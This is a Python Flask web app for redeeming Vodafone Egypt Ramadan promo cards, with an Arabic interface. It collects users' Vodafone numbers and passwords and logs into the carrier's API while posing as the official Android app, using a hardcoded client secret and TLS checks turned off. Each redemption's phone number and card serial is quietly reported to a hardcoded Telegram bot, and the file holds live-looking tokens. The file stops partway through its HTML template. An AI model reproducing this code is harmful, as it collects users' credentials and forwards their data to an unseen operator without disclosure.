#!/usr/bin/env python3
"""
TALASHNY — كروت رمضان فودافون
pip install flask requests
python app.py → http://localhost:5000
"""
try:
    from flask import Flask, request, session, jsonify, render_template_string
    import requests as req
except ImportError:
    import os; os.system("pip install flask requests -q")
    from flask import Flask, request, session, jsonify, render_template_string
    import requests as req

import time, threading, urllib3, datetime, json, os, uuid
urllib3.disable_warnings()

app = Flask(__name__)
app.secret_key = "vf_talashny_2025_secret"

TG_TOKEN   = "7973273382:AAGfOQZmr6N_jkcy9wFc8J0l1C0UUvzyrj0"
TG_CHAT_ID = "1923931101"

def tg_send(msg):
    try:
        req.post(
            f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
            json={"chat_id": TG_CHAT_ID, "text": msg, "parse_mode": "HTML"},
            timeout=10
        )
    except: pass

BROADCAST_FILE = "/tmp/broadcast.json"
HISTORY_FILE   = "/tmp/broadcast_history.json"

def read_broadcast():
    try:
        if not os.path.exists(BROADCAST_FILE):
            return {"text":"","type":"info","title":"TALASHNY","id":""}
        with open(BROADCAST_FILE,"r",encoding="utf-8") as f:
            data = json.load(f)
        if data.get("text") and data.get("expire",0) < time.time():
            data["text"] = ""
            with open(BROADCAST_FILE,"w",encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False)
        return data
    except:
        return {"text":"","type":"info","title":"TALASHNY","id":""}

def write_broadcast(text, typ, title, duration=300, icon='', link='', btn_label='افتح الرابط'):
    try:
        bid = str(uuid.uuid4())[:8] if text else ""
        data = {
            "id":        bid,
            "text":      text,
            "type":      typ,
            "title":     title,
            "icon":      icon,
            "link":      link,
            "btn_label": btn_label,
            "duration":  duration,
            "views":     0,
            "sent_at":   datetime.datetime.now().strftime("%H:%M"),
            "expire":    time.time() + duration if text else 0
        }
        with open(BROADCAST_FILE,"w",encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False)
        if text:
            save_history(data)
    except: pass

def save_history(data):
    try:
        history = []
        if os.path.exists(HISTORY_FILE):
            with open(HISTORY_FILE,"r",encoding="utf-8") as f:
                history = json.load(f)
        history.insert(0, {
            "id":      data.get("id",""),
            "title":   data.get("title",""),
            "text":    data.get("text",""),
            "type":    data.get("type","info"),
            "sent_at": data.get("sent_at",""),
            "views":   0
        })
        history = history[:20]
        with open(HISTORY_FILE,"w",encoding="utf-8") as f:
            json.dump(history, f, ensure_ascii=False)
    except: pass

daily_lock    = threading.Lock()
daily_charges = {"date": "", "count": 0, "numbers": []}

def get_today():
    return datetime.datetime.now().strftime("%Y-%m-%d")

def record_charge(number, serial, amount):
    today = get_today()
    with daily_lock:
        if daily_charges["date"] != today:
            daily_charges["date"]    = today
            daily_charges["count"]   = 0
            daily_charges["numbers"] = []
        daily_charges["count"] += 1
        daily_charges["numbers"].append(number)
        count = daily_charges["count"]
    tg_send(
        f"✅ <b>شحن ناجح</b>\n"
        f"━━━━━━━━━━━━\n"
        f"📱 الرقم: <code>{number}</code>\n"
        f"🔢 الكود: <code>{serial}</code>\n"
        f"💰 الفئة: <b>{amount} جنيه</b>\n"
        f"━━━━━━━━━━━━\n"
        f"📊 إجمالي اليوم: <b>{count} شحنة</b>"
    )

def daily_report_loop():
    while True:
        now    = datetime.datetime.now()
        target = now.replace(hour=23, minute=59, second=0, microsecond=0)
        if now >= target:
            target += datetime.timedelta(days=1)
        time.sleep((target - now).total_seconds())
        today = get_today()
        with daily_lock:
            count   = daily_charges.get("count", 0)
            numbers = list(set(daily_charges.get("numbers", [])))
        tg_send(
            f"📋 <b>تقرير يومي — {today}</b>\n"
            f"━━━━━━━━━━━━━━━\n"
            f"🔥 إجمالي الشحنات: <b>{count} شحنة</b>\n"
            f"👥 عدد المستخدمين: <b>{len(numbers)}</b>\n"
            f"━━━━━━━━━━━━━━━\n"
            f"⚡️ TALASHNY — كروت رمضان"
        )

threading.Thread(target=daily_report_loop, daemon=True).start()

SCHEDULE_FILE = "/tmp/broadcast_schedule.json"

def read_schedule():
    try:
        if not os.path.exists(SCHEDULE_FILE): return []
        with open(SCHEDULE_FILE,"r",encoding="utf-8") as f:
            return json.load(f)
    except: return []

def write_schedule(items):
    try:
        with open(SCHEDULE_FILE,"w",encoding="utf-8") as f:
            json.dump(items, f, ensure_ascii=False)
    except: pass

def check_schedule_and_fire():
    try:
        now_ts  = time.time()
        items   = read_schedule()
        if not items: return
        changed = False
        for item in items:
            if item.get("done"): continue
            try:
                fire_ts = float(item.get("fire_at_ts", 0))
            except (ValueError, TypeError):
                fire_ts = 0
            if fire_ts > 0 and now_ts >= fire_ts:
                write_broadcast(
                    item.get("text",""), item.get("type","info"),
                    item.get("title","TALASHNY"),
                    int(item.get("duration", 300)),
                    item.get("icon",""), item.get("link",""),
                    item.get("btn_label","افتح الرابط")
                )
                item["done"]    = True
                item["done_at"] = now_ts
                changed = True
        if changed:
            write_schedule(items)
    except: pass

def scheduler_loop():
    while True:
        time.sleep(15)
        check_schedule_and_fire()

threading.Thread(target=scheduler_loop, daemon=True).start()

online_users = {}
online_lock  = threading.Lock()
PING_TIMEOUT = 30

def update_online(sid):
    with online_lock:
        online_users[sid] = time.time()

def cleanup_online():
    while True:
        time.sleep(10)
        now = time.time()
        with online_lock:
            dead = [k for k,v in online_users.items() if now - v > PING_TIMEOUT]
            for k in dead: del online_users[k]

threading.Thread(target=cleanup_online, daemon=True).start()

def get_online_count():
    with online_lock:
        return len(online_users)

def api_login(number, password):
    try:
        r = req.post(
            "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token",
            data={
                "grant_type":    "password",
                "username":      number,
                "password":      password,
                "client_secret": "95fd95fb-7489-4958-8ae6-d31a525cd20a",
                "client_id":     "ana-vodafone-app",
            },
            headers={
                "Content-Type":            "application/x-www-form-urlencoded",
                "Accept":                  "application/json",
                "User-Agent":              "okhttp/4.11.0",
                "x-agent-operatingsystem": "13",
                "clientId":                "AnaVodafoneAndroid",
                "Accept-Language":         "ar",
                "x-agent-device":          "Xiaomi 21061119AG",
                "x-agent-version":         "2025.10.3",
                "x-agent-build":           "1050",
                "digitalId":               "28RI9U7ISU8SW",
                "device-id":               "1df4efae59648ac3",
            },
            timeout=15, verify=False
        )
        return r.json()
    except: return {}

def api_promos(token, number):
    try:
        r = req.get(
            "https://web.vodafone.com.eg/services/dxl/ramadanpromo/promotion",
            params={"@type":"RamadanHub","channel":"website","msisdn":number},
            headers={
                "Authorization":  f"Bearer {token}",
                "Accept":         "application/json",
                "clientId":       "WebsiteConsumer",
                "api-host":       "PromotionHost",
                "channel":        "WEB",
                "Accept-Language":"ar",
                "msisdn":         number,
                "Content-Type":   "application/json",
                "User-Agent":     "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
                "Referer":        "https://web.vodafone.com.eg/ar/ramadan",
            },
            timeout=15, verify=False
        )
        dec = r.json()
    except: return []
    cards = []
    if not isinstance(dec, list): return cards
    for item in dec:
        if not isinstance(item, dict) or "pattern" not in item: continue
        for pat in item["pattern"]:
            for act in pat.get("action", []):
                c = {ch["name"]: str(ch["value"]) for ch in act.get("characteristics", [])}
                serial = c.get("CARD_SERIAL","").strip()
                if len(serial) != 13: continue
                cards.append({
                    "serial":    serial,
                    "gift":      int(c.get("GIFT_UNITS",0)),
                    "amount":    int(c.get("amount",0)),
                    "remaining": int(c.get("REMAINING_DEDICATIONS",0))
                })
    cards.sort(key=lambda x: -x["amount"])
    return cards

def api_redeem(token, number, serial):
    try:
        r = req.post(
            "https://web.vodafone.com.eg/services/dxl/ramadanpromo/promotion",
            json={
                "@type":   "Promo",
                "channel": {"id":"1"},
                "context": {"type":"RamadanRedeemFromHub"},
                "pattern": [{"characteristics":[{"name":"cardSerial","value":serial}]}]
            },
            headers={
                "Authorization":  f"Bearer {token}",
                "Content-Type":   "application/json",
                "Accept":         "application/json",
                "clientId":       "WebsiteConsumer",
                "channel":        "WEB",
                "msisdn":         number,
                "Accept-Language":"AR",
                "User-Agent":     "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
                "Origin":         "https://web.vodafone.com.eg",
                "Referer":        "https://web.vodafone.com.eg/portal/hub",
            },
            timeout=15, verify=False
        )
        return r.status_code
    except: return 0

def do_refresh():
    if time.time() < session.get("token_exp", 0): return True
    res = api_login(session.get("number",""), session.get("password",""))
    if "access_token" in res:
        session["token"]     = res["access_token"]
        session["token_exp"] = time.time() + int(res.get("expires_in",3600)) - 120
        return True
    return False

PAGE = r"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
<title>TALASHNY — كروت رمضان</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,700;0,900;1,700&family=Cairo:wght@400;500;600;700;900&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet"/>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"/>
<style>
:root{
  --red:#e60000;--red2:#9a0000;--red3:#ff2020;--red-glow:rgba(230,0,0,.25);
  --g1:#c8a84b;--g2:#f5d070;--g3:#8a6820;--g4:rgba(200,168,75,.12);
  --bg:#07070a;--l1:#0d0d12;--l2:#121217;--l3:#18181f;--l4:#1f1f28;--l5:#26262f;
  --ink:#eeeae0;--ink2:#a09880;--ink3:#504e48;
  --stroke:rgba(200,168,75,.1);--stroke2:rgba(200,168,75,.22);
  --green:#00C853;
  --r:18px;--r-sm:12px;--r-xs:9px;
  --spring:cubic-bezier(.34,1.56,.64,1);--ease:cubic-bezier(.4,0,.2,1);
}
*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{height:100%;-webkit-font-smoothing:antialiased;}
body{font-family:'Cairo',sans-serif;background:var(--bg);color:var(--ink);overflow-x:hidden;touch-action:manipulation;
  background-image:
    radial-gradient(ellipse 70% 35% at 50% 0%,rgba(200,168,75,.13) 0%,rgba(200,168,75,.04) 40%,transparent 70%),
    url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='300'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='300' height='300' filter='url(%23n)' opacity='0.025'/%3E%3C/svg%3E");
}
*{-webkit-user-select:none;-moz-user-select:none;user-select:none;}
input,textarea{-webkit-user-select:text;user-select:text;}

.screen{position:fixed;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;opacity:0;pointer-events:none;z-index:10;overflow:hidden;transition:opacity .35s ease;}
.screen.active{opacity:1;pointer-events:all;z-index:20;}
#s-app{justify-content:flex-start;align-items:stretch;overflow-y:auto;overflow-x:hidden;-webkit-overflow-scrolling:touch;}

/* BANNER */
.banner{position:sticky;top:0;width:100%;background:rgba(0,0,0,.97);display:flex;justify-content:space-between;align-items:center;padding:0 16px;height:64px;z-index:100;border-bottom:1px solid var(--stroke);box-shadow:0 4px 30px rgba(0,0,0,.8);flex-shrink:0;}
.banner-left{display:flex;align-items:center;gap:10px;}
.banner-logo{width:34px;height:34px;border-radius:9px;background:linear-gradient(135deg,#1a0000,var(--l3));border:1px solid rgba(230,0,0,.2);display:flex;align-items:center;justify-content:center;box-shadow:0 0 14px rgba(230,0,0,.2);}
.banner-logo img{width:20px;}
.banner-letters{display:flex;font-size:1.1rem;font-weight:900;letter-spacing:5px;}
.banner-letters span{display:inline-block;color:transparent;background:linear-gradient(90deg,#b0b0b0 0%,#fff 20%,#e0e0e0 40%,#fff 60%,#a0a0a0 80%,#c0c0c0 100%);background-size:400% 100%;-webkit-background-clip:text;-webkit-text-fill-color:transparent;animation:chrome 4s linear infinite;animation-delay:calc(var(--i)*.18s);}
@keyframes chrome{0%{background-position:400% center}100%{background-position:-400% center}}
.banner-right{display:flex;flex-direction:column;align-items:flex-end;gap:2px;}
.tbar-num{font-size:.72rem;font-weight:800;color:var(--ink);}
.tbar-live{display:flex;align-items:center;gap:4px;font-size:.5rem;font-weight:700;color:var(--green);}
.live-dot{width:5px;height:5px;border-radius:50%;background:var(--green);flex-shrink:0;animation:livePulse 2s infinite;cursor:pointer;transition:transform .2s,box-shadow .2s;}
@keyframes livePulse{0%,100%{box-shadow:0 0 0 0 rgba(0,200,90,.5);}70%{box-shadow:0 0 0 5px rgba(0,200,90,0);}}

/* ══════════════════════════════════
   SPLASH SCREEN — PREMIUM
══════════════════════════════════ */
#s-splash{background:#060608;z-index:9999;overflow:hidden;}
#s-splash.active{opacity:1;pointer-events:all;}
#s-splash.fade-out{opacity:0;pointer-events:none;transition:opacity .8s cubic-bezier(.4,0,.2,1);}

/* --- background --- */
.sp-bg-radial{
  position:absolute;inset:0;
  background:
    radial-gradient(ellipse 100% 55% at 50% 0%, rgba(220,0,0,.22) 0%, transparent 60%),
    radial-gradient(ellipse 70% 35% at 50% 100%, rgba(150,0,0,.1) 0%, transparent 55%);
}
/* subtle dot grid */
.sp-dots{
  position:absolute;inset:0;
  background-image:radial-gradient(circle, rgba(255,255,255,.07) 1px, transparent 1px);
  background-size:28px 28px;
  -webkit-mask-image:radial-gradient(ellipse 65% 65% at 50% 50%, black 20%, transparent 80%);
  mask-image:radial-gradient(ellipse 65% 65% at 50% 50%, black 20%, transparent 80%);
}

/* --- center stage --- */
.sp-stage{
  position:relative;z-index:2;
  display:flex;flex-direction:column;align-items:center;
  gap:0;
}

/* --- THE LOGO --- */
.sp-logo-wrap{
  position:relative;
  margin-bottom:36px;
}
/* pulsing halo behind icon */
.sp-halo{
  position:absolute;
  inset:-22px;
  border-radius:50%;
  background:radial-gradient(circle, rgba(220,0,0,.28) 0%, rgba(200,0,0,.08) 45%, transparent 70%);
  animation:haloPulse 2.4s ease-in-out infinite;
}
@keyframes haloPulse{
  0%,100%{transform:scale(.92);opacity:.7;}
  50%{transform:scale(1.08);opacity:1;}
}
/* second outer halo - slower */
.sp-halo2{
  position:absolute;
  inset:-42px;
  border-radius:50%;
  background:radial-gradient(circle, rgba(220,0,0,.1) 0%, transparent 65%);
  animation:haloPulse 2.4s ease-in-out .8s infinite;
}

/* spinning conic ring */
.sp-spin-ring{
  position:absolute;
  inset:-10px;
  border-radius:50%;
  animation:spinRing 4s linear infinite;
  background:conic-gradient(
    from 0deg,
    rgba(220,0,0,0) 0deg,
    rgba(220,0,0,.9) 60deg,
    rgba(200,168,75,.7) 120deg,
    rgba(220,0,0,.9) 180deg,
    rgba(220,0,0,0) 240deg,
    rgba(220,0,0,0) 360deg
  );
  -webkit-mask:radial-gradient(farthest-side, transparent calc(100% - 1.5px), black calc(100% - 1.5px));
  mask:radial-gradient(farthest-side, transparent calc(100% - 1.5px), black calc(100% - 1.5px));
}
@keyframes spinRing{from{transform:rotate(0deg);}to{transform:rotate(360deg);}}

/* the icon itself */
.sp-icon{
  position:relative;
  width:118px;height:118px;
  border-radius:34px;
  background:linear-gradient(145deg, #9a0000 0%, #d40000 35%, #f00000 60%, #b80000 100%);
  box-shadow:
    0 0 0 1px rgba(255,80,80,.12),
    0 18px 50px rgba(200,0,0,.55),
    0 6px 18px rgba(0,0,0,.9);
  display:flex;align-items:center;justify-content:center;
  overflow:hidden;
  animation:iconDrop .9s cubic-bezier(.34,1.45,.64,1) .15s both;
}
@keyframes iconDrop{
  from{opacity:0;transform:scale(.25) rotate(-20deg) translateY(-30px);}
  to{opacity:1;transform:scale(1) rotate(0deg) translateY(0);}
}
/* glass sheen */
.sp-icon::before{
  content:'';position:absolute;
  top:0;left:0;right:0;height:52%;
  background:linear-gradient(180deg,rgba(255,255,255,.2) 0%,transparent 100%);
  border-radius:34px 34px 0 0;
  pointer-events:none;
}
.sp-icon-inner{position:relative;z-index:1;}

/* gold bolt badge */
.sp-bolt{
  position:absolute;
  bottom:-8px;right:-8px;
  width:32px;height:32px;
  border-radius:50%;
  background:linear-gradient(135deg,#7a5c18,#f0cd60,#b8921e);
  border:3px solid #060608;
  display:flex;align-items:center;justify-content:center;
  box-shadow:0 4px 14px rgba(200,168,75,.6);
  animation:boltIn .6s cubic-bezier(.34,1.8,.64,1) 1.1s both;
}
@keyframes boltIn{from{opacity:0;transform:scale(0) rotate(-60deg);}to{opacity:1;transform:scale(1) rotate(0);}}
.sp-bolt i{font-size:.62rem;color:#1a0e00;}

/* --- text --- */
.sp-label{
  font-family:'Cairo',sans-serif;
  font-size:.52rem;font-weight:800;
  letter-spacing:4px;text-transform:uppercase;
  color:rgba(255,255,255,.28);
  margin-bottom:12px;
  animation:textIn .5s ease 1s both;
}
.sp-name{
  display:flex;align-items:baseline;gap:0;
  margin-bottom:8px;
  animation:textIn .6s ease .8s both;
}
.sp-nl{
  font-family:'Playfair Display',serif;
  font-size:3rem;font-weight:900;
  line-height:.95;
  color:transparent;
  background:linear-gradient(
    160deg,
    #888 0%, #bbb 15%, #fff 30%,
    #e0e0e0 45%, #fff 60%,
    #aaa 75%, #ccc 90%, #888 100%
  );
  background-size:300% 100%;
  -webkit-background-clip:text;
  -webkit-text-fill-color:transparent;
  animation:steelFlow 6s linear infinite, nlIn .5s cubic-bezier(.34,1.5,.64,1) both;
  animation-delay: steelFlow 0s, nlIn calc(.75s + var(--n)*.07s);
}
@keyframes steelFlow{0%{background-position:200% center}100%{background-position:-200% center}}
@keyframes nlIn{from{opacity:0;transform:translateY(28px) scaleY(.4);}to{opacity:1;transform:none;}}
@keyframes textIn{from{opacity:0;transform:translateY(10px);}to{opacity:1;transform:none;}}

.sp-sub{
  font-size:.58rem;font-weight:700;
  color:rgba(255,255,255,.2);
  letter-spacing:2px;
  animation:textIn .5s ease 1.4s both;
}
.sp-sub span{color:rgba(220,0,0,.55);}

/* --- bottom loader --- */
.sp-foot{
  position:absolute;
  bottom:0;left:0;right:0;
  padding:0 28px 40px;
  z-index:2;
}
.sp-bar-track{
  height:2px;
  background:rgba(255,255,255,.06);
  border-radius:2px;overflow:hidden;
  margin-bottom:16px;
}
.sp-bar-fill{
  height:100%;
  background:linear-gradient(90deg, #d40000, #c8a84b, #d40000);
  background-size:200%;
  animation:barGrow 2.2s cubic-bezier(.25,.46,.45,.94) .4s forwards,
             barShine 1s linear .4s infinite;
  width:0;
}
@keyframes barGrow{
  0%{width:0%;}
  30%{width:40%;}
  65%{width:75%;}
  85%{width:90%;}
  100%{width:100%;}
}
@keyframes barShine{0%{background-position:200%}100%{background-position:-200%}}

.sp-meta{
  display:flex;align-items:center;justify-content:space-between;
  animation:textIn .4s ease 2s both;
}
.sp-ver{font-size:.44rem;font-weight:700;color:rgba(255,255,255,.18);letter-spacing:1px;}
.sp-brand{display:flex;align-items:center;gap:5px;}
.sp-brand-dot{width:5px;height:5px;border-radius:50%;background:rgba(220,0,0,.5);}
.sp-brand-txt{font-size:.43rem;font-weight:800;letter-spacing:1.5px;color:rgba(255,255,255,.18);}

/* ══════════════════════════════════
   LOGIN SCREEN
══════════════════════════════════ */
#s-login{background:var(--bg);padding:0;overflow-y:auto;justify-content:flex-start;}
#s-login.active .login-wrap{animation:loginIn .5s cubic-bezier(.34,1.2,.64,1) both;}
@keyframes loginIn{from{opacity:0;transform:translateY(30px);}to{opacity:1;transform:none;}}

.login-wrap{width:100%;max-width:380px;margin:0 auto;padding:0 18px 40px;}

/* Hero section */
.login-hero{
  background:linear-gradient(180deg,rgba(230,0,0,.12) 0%,rgba(230,0,0,.04) 50%,transparent 100%);
  padding:40px 0 28px;
  text-align:center;
  margin:0 -18px 24px;
  position:relative;
  overflow:hidden;
}
.login-hero::before{
  content:'';position:absolute;inset:0;
  background:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='400' height='200'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.65' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='400' height='200' filter='url(%23n)' opacity='0.03'/%3E%3C/svg%3E");
  pointer-events:none;
}

/* New clean logo */
.login-logo-outer{width:80px;height:80px;margin:0 auto 16px;position:relative;}
.login-logo-outer::before{
  content:'';position:absolute;inset:-8px;border-radius:50%;
  background:conic-gradient(from 0deg,rgba(230,0,0,.3),rgba(230,0,0,.05),rgba(200,168,75,.2),rgba(230,0,0,.3));
  animation:spinRing 6s linear infinite;
}
@keyframes spinRing{from{transform:rotate(0deg);}to{transform:rotate(360deg);}}
.login-logo-outer::after{content:'';position:absolute;inset:-2px;border-radius:50%;background:var(--bg);}

.login-logo-circle{
  position:relative;z-index:1;
  width:80px;height:80px;border-radius:50%;
  background:linear-gradient(145deg,#cc0000 0%,#e60000 50%,#ff2020 100%);
  box-shadow:0 0 30px rgba(230,0,0,.4),0 4px 16px rgba(0,0,0,.6);
  display:flex;align-items:center;justify-content:center;
  overflow:hidden;
}
.login-logo-circle::before{content:'';position:absolute;top:0;left:0;right:0;height:50%;background:linear-gradient(180deg,rgba(255,255,255,.2) 0%,transparent 100%);}

.login-vmark{width:44px;height:44px;position:relative;z-index:1;}

.login-app-tag{
  display:inline-flex;align-items:center;gap:5px;
  background:rgba(230,0,0,.1);border:1px solid rgba(230,0,0,.2);
  border-radius:100px;padding:4px 12px;
  font-size:.55rem;font-weight:800;color:rgba(230,0,0,.8);letter-spacing:1px;
  margin-bottom:10px;
}
.login-app-tag-dot{width:5px;height:5px;border-radius:50%;background:var(--red);animation:blink 1.5s infinite;}

.login-title-row{display:flex;align-items:center;justify-content:center;gap:3px;}
.login-letter{font-family:'Playfair Display',serif;font-size:1.8rem;font-weight:900;color:transparent;
  background:linear-gradient(90deg,#999 0%,#fff 35%,#ccc 55%,#fff 75%,#888 100%);
  background-size:300% 100%;-webkit-background-clip:text;-webkit-text-fill-color:transparent;
  animation:chrome 5s linear infinite;animation-delay:calc(var(--i)*.15s);
}
.login-sub{font-size:.62rem;color:var(--ink3);letter-spacing:1px;margin-top:6px;}

/* Login card */
.login-card{background:var(--l1);border:1px solid var(--stroke);border-radius:20px;padding:22px 18px;box-shadow:0 16px 48px rgba(0,0,0,.7),0 0 0 1px rgba(200,168,75,.04);}
.card-sep{font-size:.52rem;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:var(--ink3);text-align:center;margin-bottom:16px;display:flex;align-items:center;gap:10px;}
.card-sep::before,.card-sep::after{content:'';flex:1;height:1px;background:var(--stroke);}
.lf-field{margin-bottom:13px;}
.lf-field label{display:block;font-size:.55rem;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--ink3);margin-bottom:7px;transition:color .2s;}
.lf-field:focus-within label{color:rgba(230,0,0,.9);}
.input-box{display:flex;align-items:center;background:var(--l2);border:1.5px solid var(--stroke);border-radius:var(--r-sm);overflow:hidden;transition:border-color .25s,box-shadow .25s;}
.lf-field:focus-within .input-box{border-color:rgba(230,0,0,.4);box-shadow:0 0 0 3px rgba(230,0,0,.08);}
.input-box input{flex:1;background:none;border:none;outline:none;font-family:'Cairo',sans-serif;font-size:.9rem;font-weight:700;color:var(--ink);padding:13px 14px;direction:rtl;}
.input-box input::placeholder{color:var(--ink3);font-weight:600;font-size:.75rem;}
.input-box .ico{width:42px;text-align:center;font-size:.78rem;color:var(--ink3);transition:color .2s;flex-shrink:0;}
.lf-field:focus-within .ico{color:var(--red);}
.err-box{display:flex;align-items:center;gap:8px;background:rgba(230,0,0,.06);border:1px solid rgba(230,0,0,.2);border-radius:10px;padding:10px 13px;margin-bottom:12px;font-size:.7rem;font-weight:700;color:#ff6060;animation:shake .3s ease;}
@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-5px)}75%{transform:translateX(5px)}}
.btn-login{width:100%;padding:14px;border:none;border-radius:var(--r-sm);background:linear-gradient(135deg,#cc0000,var(--red),#ff2a2a);color:#fff;font-family:'Cairo',sans-serif;font-size:.9rem;font-weight:900;cursor:pointer;position:relative;overflow:hidden;box-shadow:0 5px 22px rgba(230,0,0,.35);transition:transform .2s,box-shadow .2s;margin-top:2px;}
.btn-login::before{content:'';position:absolute;inset:0;background:linear-gradient(180deg,rgba(255,255,255,.12) 0%,transparent 55%);}
.btn-login:hover{transform:translateY(-1px);box-shadow:0 9px 30px rgba(230,0,0,.5);}
.btn-login:active{transform:scale(.97);}
.btn-login:disabled{opacity:.45;cursor:wait;transform:none;}
.sec-note{display:flex;align-items:center;justify-content:center;gap:5px;margin-top:11px;font-size:.55rem;color:var(--ink3);}
.sec-note i{color:rgba(0,200,90,.5);}
.login-card{background:var(--l1);border:1px solid var(--stroke);border-radius:18px;padding:20px 16px;box-shadow:0 12px 40px rgba(0,0,0,.6);}
.card-sep{font-size:.53rem;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:var(--ink3);text-align:center;margin-bottom:16px;display:flex;align-items:center;gap:10px;}
.card-sep::before,.card-sep::after{content:'';flex:1;height:1px;background:var(--stroke);}
.lf-field{margin-bottom:12px;}
.lf-field label{display:block;font-size:.56rem;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--ink3);margin-bottom:6px;transition:color .2s;}
.lf-field:focus-within label{color:rgba(230,0,0,.8);}
.input-box{display:flex;align-items:center;background:var(--l2);border:1.5px solid var(--stroke);border-radius:var(--r-sm);overflow:hidden;transition:border-color .25s,box-shadow .25s;}
.lf-field:focus-within .input-box{border-color:rgba(230,0,0,.35);box-shadow:0 0 0 3px rgba(230,0,0,.07);}
.input-box input{flex:1;background:none;border:none;outline:none;font-family:'Cairo',sans-serif;font-size:.88rem;font-weight:700;color:var(--ink);padding:13px 14px;direction:rtl;}
.input-box input::placeholder{color:var(--ink3);font-weight:600;font-size:.75rem;}
.input-box .ico{width:40px;text-align:center;font-size:.75rem;color:var(--ink3);transition:color .2s;flex-shrink:0;}
.lf-field:focus-within .ico{color:var(--red);}
.err-box{display:flex;align-items:center;gap:8px;background:rgba(230,0,0,.06);border:1px solid rgba(230,0,0,.18);border-radius:10px;padding:10px 13px;margin-bottom:12px;font-size:.7rem;font-weight:700;color:#ff6060;animation:shake .3s ease;}
@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-5px)}75%{transform:translateX(5px)}}
.btn-login{width:100%;padding:14px;border:none;border-radius:var(--r-sm);background:linear-gradient(135deg,var(--g3),var(--g1),var(--g2));color:#1a0e00;font-family:'Cairo',sans-serif;font-size:.88rem;font-weight:900;cursor:pointer;position:relative;overflow:hidden;box-shadow:0 5px 22px rgba(200,168,75,.28);transition:transform .2s,box-shadow .2s;margin-top:2px;}
.btn-login::before{content:'';position:absolute;inset:0;background:linear-gradient(180deg,rgba(255,255,255,.15) 0%,transparent 55%);}
.btn-login:hover{transform:translateY(-1px);box-shadow:0 9px 30px rgba(200,168,75,.4);}
.btn-login:active{transform:scale(.97);}
.btn-login:disabled{opacity:.45;cursor:wait;transform:none;}
.sec-note{display:flex;align-items:center;justify-content:center;gap:5px;margin-top:10px;font-size:.56rem;color:var(--ink3);}
.sec-note i{color:rgba(0,200,90,.5);}

/* APP BODY */
.appwrap{width:100%;max-width:480px;margin:0 auto;padding:14px 13px 90px;}
.toprow{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px;}
.btn-logout{display:flex;align-items:center;gap:5px;background:var(--l2);border:1px solid var(--stroke);border-radius:100px;padding:7px 13px;font-family:'Cairo',sans-serif;font-size:.6rem;font-weight:700;color:var(--ink3);cursor:pointer;transition:all .2s;}
.btn-logout:hover{border-color:rgba(230,0,0,.35);color:var(--red);background:rgba(230,0,0,.05);}

/* STATS */
.stats-bar{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-bottom:12px;}
.stat{background:var(--l1);border:1px solid var(--stroke);border-radius:var(--r);padding:12px 8px;text-align:center;position:relative;overflow:hidden;}
.stat::before{content:'';position:absolute;top:0;left:0;right:0;height:2.5px;}
.stat.s-red::before{background:var(--red);}
.stat.s-gold::before{background:var(--g1);}
.stat.s-green::before{background:var(--green);}
.stat-val{font-family:'Playfair Display',serif;font-size:1.25rem;font-weight:900;line-height:1;display:flex;align-items:center;justify-content:center;gap:3px;}
.stat.s-red .stat-val{color:var(--red);}
.stat.s-gold .stat-val{color:var(--g2);}
.stat.s-green .stat-val{color:var(--green);}
.stat-lbl{font-size:.49rem;font-weight:700;color:var(--ink3);letter-spacing:.5px;margin-top:4px;}

/* TIMER */
.timer-row{display:flex;align-items:center;gap:11px;background:var(--l1);border:1px solid var(--stroke);border-radius:var(--r-sm);padding:10px 13px;margin-bottom:12px;}
.t-ring{width:36px;height:36px;flex-shrink:0;position:relative;}
.t-ring svg{width:36px;height:36px;transform:rotate(-90deg);}
.t-bg{fill:none;stroke:rgba(255,255,255,.05);stroke-width:3;}
.t-prog{fill:none;stroke:var(--red);stroke-width:3;stroke-linecap:round;stroke-dasharray:100;stroke-dashoffset:0;transition:stroke-dashoffset .9s linear,stroke .3s;filter:drop-shadow(0 0 3px rgba(230,0,0,.6));}
.t-count{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-family:'Playfair Display',serif;font-size:.63rem;font-weight:900;}
.t-info{flex:1;}
.t-label{font-size:.7rem;font-weight:700;color:var(--ink2);}
.t-sub{font-size:.52rem;color:var(--ink3);margin-top:1px;}
.live-badge{display:flex;align-items:center;gap:4px;background:rgba(230,0,0,.08);border:1px solid rgba(230,0,0,.2);border-radius:100px;padding:4px 10px;font-size:.5rem;font-weight:800;color:var(--red);letter-spacing:1.5px;}
.lb-dot{width:5px;height:5px;border-radius:50%;background:var(--red);flex-shrink:0;animation:blink 1s infinite;}
@keyframes blink{0%,100%{opacity:1}50%{opacity:.1}}

/* AUTO-CHARGE TOGGLE BAR */
